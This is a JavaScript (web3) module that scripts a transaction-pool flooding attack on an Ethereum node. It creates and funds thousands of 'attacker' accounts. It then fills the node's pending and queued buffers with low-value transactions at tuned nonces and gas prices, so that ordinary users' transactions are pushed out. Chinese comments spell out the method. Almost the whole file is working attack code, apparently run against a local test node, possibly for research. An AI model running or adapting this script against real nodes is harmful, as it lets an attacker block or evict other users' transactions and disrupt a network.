const fs = require('fs');
let Web3 = require('web3');

let genKeys = function(){
    let ea = global.ea;
    let privateKey = require('crypto').randomBytes(32).toString('hex');
    let publicKey = ea.web3.eth.accounts.privateKeyToAccount(privateKey.toString('hex'));
    return {
        publicKey : publicKey.address,
        privateKey : privateKey
    }
}
function sleep(time){
    return new Promise(resolve=>{
        setTimeout(function(){
            resolve();
        }, time);
    })
}

let attackerFor5120 = {
    init : async function(){
        let attackers = [];
        // for(var i=0;i<5120;i++) {
        //     attackers.push(genKeys());
        // }
        // fs.writeFileSync(`${__dirname}/../example/attacker5120.json`, JSON.stringify(attackers));
        attackers = JSON.parse(fs.readFileSync(`${__dirname}/../example/attacker5120.json`).toString());

        // // 转钱
        let transPromise = []
        for(var k=0;k<20;k++) {
            for(let i = 256*k;i < 256*(k+1);i++) {
                let temp = ea.handle.sendTrans(ea.Config, attackers[i], 1, i, 21000);
                // await sleep(16)
                transPromise.push(temp);
                console.log(`done: ${i} / ${attackers.length}`);
            }
        }

        // await ea.handle.dumpBalance([ea.Config]);
        // await ea.handle.dumpBalance(attackers);
    },

    attack : async function(){
        let attackers = JSON.parse(fs.readFileSync(`${__dirname}/../example/attacker5120.json`).toString());
        async function pushPending(){
            for(var k=0;k<20;k++) {
                for(let i = 256*k;i < 256*(k+1);i++) {
                    let temp = ea.handle.sendTrans(attackers[i], ea.Config, 0.000001, 0, 21000);
                    await sleep(30)
                    console.log(`done: ${i} / ${attackers.length}`);
                }
                await sleep(1000);
            }
        }
        async function checkPending(){
            let content = await ea.web3.eth.txpool.content();
            for(var i=0;i<attackers.length;i++) {
                if(!(attackers[i].publicKey in content.pending)){
                    // console.log(i)
                    let temp = ea.handle.sendTrans(attackers[i], ea.Config, 0.000001, 0, 21000);
                }
            }
        }

        async function pushQueued1(){
            for(var k=0;k<20;k++) {
                for(let i = 256*k;i < 256*(k+1);i++) {
                    let temp = ea.handle.sendTrans(attackers[i], ea.Config, 0.000001, 1, 21000);
                    await sleep(30)
                    console.log(`done: ${i} / ${attackers.length}`);
                }
                await sleep(5000);
            }
        }
        async function checkQueued1(){
            let content = await ea.web3.eth.txpool.content();
            for(var i=0;i<attackers.length;i++) {
                if(Object.keys(content.pending[attackers[i].publicKey]).length <2) {
                    let temp = ea.handle.sendTrans(attackers[i], ea.Config, 0.000001, 1, 21000);
                }
            }
        }

        
        // await pushPending();
        // await checkPending();

        // await pushQueued1();
        // await checkQueued1();

        // 主账号给他来一笔交易
        // ea.handle.sendTrans(ea.Config, attackers[0], 0.000001, 0, 21000);
        // 攻击账号来一笔
        // ea.handle.sendTrans(attackers[0], ea.Config, 0.000001, 1, 21000);
    },

    checkTxPool : async function(){
        let attackers = JSON.parse(fs.readFileSync(`${__dirname}/../example/attacker5120.json`).toString());
        let users = JSON.parse(fs.readFileSync(`${__dirname}/../example/users.json`).toString());
        let web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8546"));
        web3.eth.extend({
            property: 'txpool',
            methods: [{
                name: 'content',
                call: 'txpool_content'
            },{
                name: 'inspect',
                call: 'txpool_inspect'
            },{
                name: 'status',
                call: 'txpool_status'
            }]
        });

        let content = await web3.eth.txpool.content();
        let content0 = await ea.web3.eth.txpool.content();

        for(var i=0;i<attackers.length;i++) {
            if(!(attackers[i].publicKey in content.pending)) {
                console.log(i)
            }
        }

        console.log(Object.keys(content.pending[attackers[0].publicKey]))
        
        // console.log('==============local pending for account-16==============')
        // console.log(Object.keys(content0.pending[attackers[16].publicKey]));
        // console.log('==============remote pending for account-16==============')
        // console.log(Object.keys(content.pending[attackers[16].publicKey]));
        // console.log('==============remote queued for account-16==============')
        
        // console.log('==============local==============')
        // console.log(Object.keys(content0.pending[attackers[0].publicKey]));
        // console.log('==============remote==============')
        // console.log(Object.keys(content.pending[attackers[0].publicKey]));

        // console.log('==============local pending for account-0==============')
        // console.log(Object.keys(content0.pending[attackers[0].publicKey]));
        // console.log('==============remote pending for account-0==============')
        // console.log(Object.keys(content.pending[attackers[0].publicKey]));
        // console.log('==============remote queued for account-0==============')
        // console.log(Object.keys(content.queued[attackers[0].publicKey]));

        // console.log('==============local pending for users-0==============')
        // console.log(Object.keys(content0.pending[users[0].publicKey]));
        // console.log('==============remote pending for users-0==============')
        // console.log(Object.keys(content.pending[users[0].publicKey]));
        // console.log('==============remote queued for user-0==============')
        // console.log(Object.keys(content.queued[users[0].publicKey]));
    }
}

let attackFor256 = {
    init : async function(){
        let attackers = [];
        // gen
        // for(var i=0;i<256;i++) {
        //     attackers.push(genKeys());
        // }
        // fs.writeFileSync(`${__dirname}/../example/attacker256.json`, JSON.stringify(attackers));

        // attackers = JSON.parse(fs.readFileSync(`${__dirname}/../example/attacker256.json`).toString());
        // 转钱
        // let transPromise = []
        // for(var i=0;i<attackers.length;i++) {
        //     let temp = ea.handle.sendTrans(ea.Config, attackers[i], 1, i);
        //     transPromise.push(temp);
        // }
        // await Promise.all(transPromise);
        // await ea.handle.dumpBalance(attackers);

        let users = [];
        // for(var i=0;i<256;i++) {
        //     users.push(genKeys());
        // }
        // fs.writeFileSync(`${__dirname}/../example/users.json`, JSON.stringify(users));
        users = fs.readFileSync(`${__dirname}/../example/users.json`).toString();
        users = JSON.parse(users);
        // let transPromise = []
        // for(var i=0;i<users.length;i++) {
        //     let temp = ea.handle.sendTrans(ea.Config, users[i], 1, i);
        //     transPromise.push(temp);
        // }
        // await Promise.all(transPromise);
        await ea.handle.dumpBalance(users);
    },
    start : async function(){
        let attackers = JSON.parse(fs.readFileSync(`${__dirname}/../example/attacker256.json`).toString());
        let users = JSON.parse(fs.readFileSync(`${__dirname}/../example/users.json`).toString());

        /**
         * 整点用户交易，被挤掉的
         */
        async function pushUserTrans(){
            let result = ea.handle.sendTrans(users[0], ea.Config.attackers[1], 0.000001, 1, 21009);
        }

        /**
         * 压满remote的pending
         * 其中：每个账号的第二笔交易的gasPrice应该为最低。
         */
        async function pushPending(){
            let promise = [];
            for(var account=0;account<attackers.length;account++) {
                // 每个账号转16笔钱给母账号
                for(let k=0;k<16;k++) {
                    let result;
                    // if(k == 1) {
                    //     result = ea.handle.sendTrans(attackers[account], ea.Config.attackers[1], 0.000001, k, 21100);
                    // } else {
                    //     result = ea.handle.sendTrans(attackers[account], ea.Config.attackers[1], 0.000001, k, 22000);
                    // }
                    result = ea.handle.sendTrans(attackers[account], ea.Config.attackers[1], 0.000001, k, 22000);
                    promise.push(result);
                }
            }
            // await Promise.all(promise);
            return ;
        }

        // 压满remote的queued
        async function pushQueued(){
            let promise = [];
            for(var account=0;account<16;account++) {
                let top = 16;
                // 压16个账号
                for(var i=top;i<top+1;i++) {
                    let result = ea.handle.sendTrans(attackers[account], ea.Config.attackers[1], 0.000001, i, 23000);
                    promise.push(result);
                }
                await sleep(500);
                top = 17;
                for(var i=top;i<top+64;i++) {
                    let result = ea.handle.sendTrans(attackers[account], ea.Config.attackers[1], 0.000001, i, 23000);
                    promise.push(result);
                }
                await sleep(500);
                console.log(`done: ${account}`);
            }
            await Promise.all(promise);
            return ;
        }

        // await pushUserTrans();
        // await pushPending();
        await pushQueued();

        // 用第17个账号骚一下，发17号交易过去。这样就会挤掉1号账号的第16笔交易 (前提是1号账号的所有交易都是22000gasPrice)
        // 
        // let top = 16;
        // let res = ea.handle.sendTrans(attackers[16], ea.Config.attackers[1], 0.000001, top, 24000);

        // 然后再用17号账号发18号交易看看。这样会挤掉1号账号的第15笔交易（剩下14笔）
        // let top = 17;
        // let res = ea.handle.sendTrans(attackers[16], ea.Config.attackers[1], 0.000001, top, 24000);
    },

    checkTxPool : async function(){
        let attackers = JSON.parse(fs.readFileSync(`${__dirname}/../example/attacker256.json`).toString());
        let users = JSON.parse(fs.readFileSync(`${__dirname}/../example/users.json`).toString());
        let web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8546"));
        web3.eth.extend({
            property: 'txpool',
            methods: [{
                name: 'content',
                call: 'txpool_content'
            },{
                name: 'inspect',
                call: 'txpool_inspect'
            },{
                name: 'status',
                call: 'txpool_status'
            }]
        });

        let content = await web3.eth.txpool.content();
        let content0 = await ea.web3.eth.txpool.content();
        
        // console.log('==============local pending for account-16==============')
        // console.log(Object.keys(content0.pending[attackers[16].publicKey]));
        // console.log('==============remote pending for account-16==============')
        // console.log(Object.keys(content.pending[attackers[16].publicKey]));
        // console.log('==============remote queued for account-16==============')
        
        // console.log('==============local==============')
        // console.log(Object.keys(content0.pending[attackers[0].publicKey]));
        // console.log('==============remote==============')
        // console.log(Object.keys(content.pending[attackers[0].publicKey]));

        // console.log('==============local pending for account-0==============')
        // console.log(Object.keys(content0.pending[attackers[0].publicKey]));
        // console.log('==============remote pending for account-0==============')
        // console.log(Object.keys(content.pending[attackers[0].publicKey]));
        // console.log('==============remote queued for account-0==============')
        // console.log(Object.keys(content.queued[attackers[0].publicKey]));

        console.log('==============local pending for users-0==============')
        console.log(Object.keys(content0.pending[users[0].publicKey]));
        // console.log('==============remote pending for users-0==============')
        // console.log(Object.keys(content.pending[users[0].publicKey]));
        console.log('==============remote queued for user-0==============')
        console.log(Object.keys(content.queued[users[0].publicKey]));
    }
}

async function init(){
    let ea = global.ea;
    let obj = {
        
    }

    /**
     * pending 缓冲区4096，queue 缓冲区1024，满了就会看看哪个账号有16+个交易，有就踢掉一些他的交易。
     * 攻击方式就是创造一大堆攻击账号，然后发16个交易，塞满pending。
     */
    async function test(){
        let promiss = [];
        // ea.handle.dunpNonce(ea.Config.attackers[0]);
        // return ;
        // let result = ea.handle.sendTrans(ea.Config.attackers[0], ea.Config.attackers[1], 0.000001, 0);
        // for(var i=0;i<17;i++) {
        //     let result = ea.handle.sendTrans(ea.Config.attackers[0], ea.Config.attackers[1], 0.000001, i);
        //     promiss.push(result);
        // }
        // let result = await Promise.all(promiss);
        // console.log(result);
        return ;
    }


    let handle = {
        test : test,
        attackFor256 : attackFor256,
        attackerFor5120 : attackerFor5120
    }

    obj.handle = handle;

    return obj;
}

module.exports = init;